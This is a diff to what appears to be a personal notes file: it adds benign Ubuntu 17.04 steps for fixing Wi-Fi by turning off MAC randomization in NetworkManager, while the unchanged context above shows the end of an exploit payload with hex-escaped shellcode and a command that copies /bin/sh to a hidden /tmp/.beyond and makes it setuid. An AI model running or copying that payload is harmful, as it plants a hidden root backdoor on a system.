@@ -51,3 +51,21 @@ release */
 “\x6e\x2f\x73\x68\x00\x2d\x63\x00″
 “cp -p /bin/sh /tmp/.beyond; chmod 4755
 /tmp/.beyond;”;```
+
+## Ubuntu 17.04
+### If Wifi is not connecting
+
+Edit the file /etc/NetworkManager/NetworkManager.conf
+
+```sudo su```
+
+```pico /etc/NetworkManager/NetworkManager.conf```
+
+Add the following code at the end of this file
+
+```[device]
+wifi.scan-rand-mac-address=no```
+
+After saving simply restart the network
+
+```sudo service network-manager restart```
